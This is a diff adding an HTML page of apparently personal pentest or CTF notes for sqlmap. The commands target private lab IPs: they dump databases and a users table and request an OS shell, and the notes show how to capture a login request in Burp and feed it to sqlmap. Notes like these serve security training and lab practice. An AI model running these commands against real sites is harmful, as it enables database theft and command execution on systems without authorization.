@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>sqlmap</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>sqlmap</h1><br/>sqlmap -u <a href="http://10.10.10.161">http://10.10.10.161</a> --crawl=1<br /><br />sqlmap -u &quot;<a href="http://192.168.11.135/?nid=2"">http://192.168.11.135/?nid=2&quot;</a> --risk=3 --level=5 --dbs --dump<br /><br />sqlmap -u “http://192.168.11.135/?nid=2” --risk=3 --level=5 --os-shell -D DATABASENAME<br /><br />sqlmap -u &quot;<a href="http://192.168.11.135/?nid=2"">http://192.168.11.135/?nid=2&quot;</a> --risk=3 --level=5 --threads=4 --dbs --tables --batch                          --forms<br /><br />sqlmap -u &quot;<a href="http://192.168.11.135/?nid=2"">http://192.168.11.135/?nid=2&quot;</a> --risk=3 --level=5 --threads=4 --dbs  --batch -T users --dump<br /><br /><br />catch POST to login page (or whatever) with burp<br />send to repeater, and copy the text out (by highlighting it)<br />put that text into a .txt file (post.txt)<br />sqlmap -r post.txt -p uname              (uname must be changed out with the sql-injectable element)<br /><br /><br /><br />sqlmap -r artist.txt -p artist<br />sqlmap -r artist.txt -p artist --risk=3 --level=5 --dbs --dump<br />sqlmap -r artist3.txt -p artist --risk=3 --level=5 --dbs --dump --os-shell -D music<br /></div></body></html>
